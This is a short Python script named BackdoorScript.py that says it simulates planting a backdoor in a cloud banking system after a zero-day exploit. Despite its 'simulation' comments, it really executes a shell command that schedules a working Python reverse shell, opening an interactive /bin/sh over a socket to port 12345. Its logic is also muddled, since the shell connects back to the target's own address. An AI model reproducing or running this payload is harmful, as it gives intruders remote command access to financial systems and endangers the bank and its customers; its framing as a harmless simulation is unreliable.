```python
# BackdoorScript.py
# This module simulates the injection of a backdoor into the Tiān Wǎng cloud banking system.
# It is used after successfully exploiting a zero-day vulnerability.

import os
import subprocess

def inject_backdoor(target_system):
    """
    Simulates the injection of a backdoor into the target system.
    
    Args:
    target_system (str): The identifier or IP of the target system.

    Returns:
    bool: True if the backdoor injection was successful, False otherwise.
    """
    try:
        # Simulated command to inject a backdoor
        command = f"echo 'python -c \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\'{target_system}\',12345)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\'/bin/sh\',\'-i\']);\"' | at now + 1 minute"
        
        # Execute the command on the target system (simulation)
        process = subprocess.run(command, shell=True, text=True, capture_output=True)
        
        if process.returncode == 0:
            print("Backdoor injection successful.")
            return True
        else:
            print("Backdoor injection failed.")
            return False
    except Exception as e:
        print(f"Failed to inject backdoor: {e}")
        return False

if __name__ == "__main__":
    # Example target system (this would be replaced with the actual target in a real scenario)
    target_system = "192.168.1.100"
    inject_backdoor(target_system)
```
